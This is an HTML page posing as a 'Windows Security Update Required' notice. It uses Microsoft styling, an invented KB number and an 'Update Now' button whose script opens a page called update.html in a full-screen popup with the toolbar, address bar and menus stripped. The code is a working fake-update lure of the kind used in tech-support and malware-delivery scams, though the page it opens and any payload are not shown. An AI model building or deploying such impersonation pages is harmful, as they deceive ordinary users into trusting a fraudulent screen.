 <!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Windows Security Update</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#003f6b;font-family:'Segoe UI',sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;user-select:none}
  .box{text-align:center;max-width:500px;padding:40px}
  .icon{font-size:64px;margin-bottom:20px}
  h1{font-size:28px;font-weight:300;margin-bottom:15px}
  p{font-size:15px;color:rgba(255,255,255,.7);margin-bottom:30px;line-height:1.6}
  .btn{background:#0078d4;color:#fff;border:0;padding:15px 50px;font-size:18px;border-radius:6px;cursor:pointer}
  .btn:hover{background:#005a9e}
  .btn:disabled{background:#444;cursor:not-allowed}
  small{display:block;margin-top:25px;font-size:11px;color:rgba(255,255,255,.25)}
</style>
</head>
<body>
<div class="box">
  <div class="icon">🔧</div>
  <h1>Windows Security Update Required</h1>
  <p>Critical security patches are available for your device.<br><br><strong>Click "Update Now" to install.</strong></p>
  <button class="btn" id="startBtn">⚠️ Update Now</button>
  <small>Windows 11 Security • KB5050520</small>
</div>
<script>
document.getElementById('startBtn').onclick = function() {
  this.textContent = '✓ Installing...';
  this.disabled = true;
  var w = screen.width, h = screen.height;
  var p = window.open('update.html','_blank','width='+w+',height='+h+',top=0,left=0,toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no');
  if(!p) window.location.href = 'update.html';
};
</script>
</body>
</html>
